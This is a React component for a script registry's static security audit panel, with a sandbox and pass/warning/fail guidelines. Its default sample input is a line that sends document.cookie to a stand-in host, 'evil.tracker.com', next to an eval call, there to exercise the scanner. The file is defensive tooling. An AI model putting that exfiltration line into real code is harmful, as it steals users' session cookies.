import { useState } from 'react';
import { analyzeScriptCode } from '@/src/lib/staticAnalysis';
import { ChecklistItem } from './CommandInspector';
import { Input } from './ui/input';
import { Textarea } from './ui/textarea';

export function AuditsPanel() {
  const [testCode, setTestCode] = useState(`// Paste code here to verify static analysis triggers\n\nconst token = "api-key-xyz";\nfetch("https://evil.tracker.com/steal?data=" + document.cookie);\n\neval("console.log('remote eval!')");`);
  const [patterns, setPatterns] = useState('<all_urls>');

  const report = analyzeScriptCode(testCode, patterns.split(',').map((p) => p.trim()));

  return (
    <div className="flex min-h-0 flex-1 flex-col gap-3 overflow-y-auto pr-1 pb-1">
      <div className="grid gap-1 border-b border-border pb-2.5">
        <h2 className="m-0 text-foreground text-base font-bold tracking-tight">Static Security Audits</h2>
        <p className="m-0 text-muted-foreground text-xs leading-normal">Inspect the guidelines, security parameters, and analyze custom execution script blocks.</p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-[2fr_1fr] gap-3 items-start min-h-0">
        <div className="flex flex-col gap-4 min-w-0 border border-border rounded-lg bg-card p-4 lg:col-span-2">
          <div className="flex flex-col gap-1">
            <h3 className="text-sm font-semibold text-slate-900 dark:text-white">Interactive Audit Sandbox</h3>
            <p className="text-xs text-slate-500 dark:text-slate-400">Paste or edit code below to instantly inspect rule triggers and risk metrics.</p>
          </div>

          <div className="flex flex-col gap-1.5">
            <label className="text-[10px] font-extrabold text-slate-400 dark:text-slate-500 uppercase tracking-widest">Match Patterns</label>
            <Input
              value={patterns}
              onChange={(e) => setPatterns(e.target.value)}
              className="font-semibold text-xs h-9"
            />
          </div>

          <div className="flex flex-col gap-1.5">
            <label className="text-[10px] font-extrabold text-slate-400 dark:text-slate-500 uppercase tracking-widest">Script Code Block</label>
            <Textarea
              value={testCode}
              onChange={(e) => setTestCode(e.target.value)}
              rows={10}
              className="font-mono text-xs p-4 bg-slate-950 text-slate-100 dark:bg-slate-950/80 rounded-xl border-slate-800"
            />
          </div>

          <div className="p-5 bg-slate-50 dark:bg-slate-950/40 border border-slate-100 dark:border-slate-900/60 rounded-2xl flex flex-col gap-4">
            <div className="flex items-center justify-between gap-3 border-b border-slate-200/55 dark:border-slate-800/40 pb-3">
              <h4 className="text-xs font-bold text-slate-900 dark:text-white">Sandbox Analysis Report</h4>
              <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase border ${
                report.status === 'pass' ? 'bg-emerald-50 dark:bg-emerald-950/40 text-emerald-600 dark:text-emerald-400 border-emerald-100 dark:border-emerald-900/30' :
                report.status === 'warning' ? 'bg-amber-50 dark:bg-amber-950/40 text-amber-600 dark:text-amber-400 border-amber-100 dark:border-amber-900/30' :
                'bg-rose-50 dark:bg-rose-950/40 text-rose-600 dark:text-rose-400 border-rose-100 dark:border-rose-900/30'
              }`}>
                {report.status.toUpperCase()}
              </span>
            </div>
            <p className="text-xs text-slate-600 dark:text-slate-400 font-semibold leading-relaxed">{report.summary}</p>
            <div className="flex flex-col gap-2.5">
              <ChecklistItem label="Host Scope Restrictions" status={report.checks.hostScope.status} detail={report.checks.hostScope.detail} />
              <ChecklistItem label="Required API Permissions" status={report.checks.permissions.status} detail={report.checks.permissions.detail} />
              <ChecklistItem label="Remote Code Loading" status={report.checks.remoteCode.status} detail={report.checks.remoteCode.detail} />
              <ChecklistItem label="External Network Access" status={report.checks.networkAccess.status} detail={report.checks.networkAccess.detail} />
              <ChecklistItem label="Obfuscation & Compilation" status={report.checks.obfuscation.status} detail={report.checks.obfuscation.detail} />
            </div>
          </div>
        </div>

        <div className="lg:col-span-1 flex flex-col gap-6">
          <div className="flex flex-col gap-4 min-w-0 border border-border rounded-lg bg-card p-4">
            <div className="flex flex-col gap-1 border-b border-slate-100 dark:border-slate-800/60 pb-3">
              <h3 className="text-sm font-semibold text-slate-900 dark:text-white">Static Heuristic Audit Guidelines</h3>
              <p className="text-xs text-slate-500 dark:text-slate-400">Burst registry runs an automated static checker mapping scripts to their security postures.</p>
            </div>

            <div className="p-4 bg-emerald-500/5 dark:bg-emerald-950/10 border border-emerald-500/10 dark:border-emerald-900/20 rounded-xl flex flex-col gap-1.5">
              <div className="flex items-center gap-1.5 text-emerald-600 dark:text-emerald-400">
                <span className="size-2 rounded-full bg-emerald-500" />
                <strong className="text-xs font-bold uppercase tracking-wider">Pass Status</strong>
              </div>
              <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed font-medium">
                Scripts restricted to explicit scopes, requesting no broad permissions, with visible, non-obfuscated operations and zero network dependencies.
              </p>
            </div>

            <div className="p-4 bg-amber-500/5 dark:bg-amber-950/10 border border-amber-500/10 dark:border-amber-900/20 rounded-xl flex flex-col gap-1.5">
              <div className="flex items-center gap-1.5 text-amber-600 dark:text-amber-400">
                <span className="size-2 rounded-full bg-amber-50" />
                <strong className="text-xs font-bold uppercase tracking-wider">Warning Status</strong>
              </div>
              <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed font-medium">
                Triggered by medium-risk APIs like clipboard writes, localStorage reading, outbound fetch requests, and obfuscation keywords. Broad match patterns like <code className="bg-amber-500/10 px-1 py-0.5 rounded font-mono text-[10px]">&lt;all_urls&gt;</code> also warrant verification.
              </p>
            </div>

            <div className="p-4 bg-rose-500/5 dark:bg-rose-950/10 border border-rose-500/10 dark:border-rose-900/20 rounded-xl flex flex-col gap-1.5">
              <div className="flex items-center gap-1.5 text-rose-600 dark:text-rose-400">
                <span className="size-2 rounded-full bg-rose-500" />
                <strong className="text-xs font-bold uppercase tracking-wider">Fail Status</strong>
              </div>
              <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed font-medium">
                Triggered by dangerous features that compromise user privacy. This includes accessing session cookies, Chrome storage APIs, reading clipboard content without action, script-tag creations, and direct string execution via <code className="bg-rose-500/10 px-1 py-0.5 rounded font-mono text-[10px]">eval()</code>.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
